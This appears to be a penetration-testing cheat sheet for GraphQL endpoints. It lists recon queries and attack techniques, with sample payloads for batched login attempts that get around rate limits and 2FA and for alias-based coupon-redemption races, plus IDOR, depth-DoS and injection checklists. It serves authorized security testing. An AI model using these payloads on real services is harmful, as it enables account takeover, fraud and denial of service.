# GraphQL

One endpoint, full schema, and authorization applied per-resolver — often unevenly.

---

## Recon

```bash
python3 07-tooling/python/graphql_probe.py -u https://t/graphql --tag r7
```

- Introspection: `{__schema{types{name}}}`. Disabled? Try `__type(name:"User")`.
- Field suggestions: send `{ user { nam } }` and read "Did you mean".
- `__typename` everywhere to confirm the endpoint.
- GET-based queries (`?query=`), and `application/graphql` content type.

---

## Attack surface

- **IDOR via node**: `node(id:"<base64 Type:123>")` — the global id often skips checks.
- **Field-level auth**: query an admin-only field on a user object.
- **Batching**: array of queries → bypass rate limits and 2FA.
- **Aliasing**: 100 aliases of the same mutation in one request → race/limit bypass.
- **Depth**: deeply nested query → DoS.
- **Introspection of mutations**: find `deleteUser`, `updateRole`, `impersonate`.
- **Arguments**: `first: 10000`, `filter: {}`, `orderBy:`.

---

## Batching for 2FA bypass

```json
[{"query":"mutation{login(user:\"a\",pass:\"x\"){token}}"},
 {"query":"mutation{login(user:\"a\",pass:\"y\"){token}}"}, ...]
```

All attempts land in one request → no per-request rate limit.

---

## Alias race

```graphql
mutation {
  a: redeemCoupon(code:"X"){ok}
  b: redeemCoupon(code:"X"){ok}
  c: redeemCoupon(code:"X"){ok}
}
```

---

## Injection through GraphQL

Arguments flow into resolvers → SQL/NoSQL/SSRF/SSTI as usual. Test every argument with
the class payloads. Also try `filter` JSON directly.

---

## Introspection when disabled

- `__type(name:"Query"){fields{name}}`
- Field suggestion errors
- The client bundle's `.graphql` files / persisted queries
- `GET /graphql?sdl` (some servers expose SDL)

---

## Go deeper

1. Enumerate every mutation and test each as the lowest role.
2. Test `node(id:)` with ids harvested from every list query.
3. Test whether `first: -1` or `first: 99999` works.
4. Test whether introspection is enabled on the *staging* endpoint.
5. Check for `graphql-playground`, `graphiql`, and `/voyager` in production.

---

## Related

- `03-bypass/bypass-doctrine.md`
- `00-core/impact-proof.md`
- `11-regex/10-verification.md`
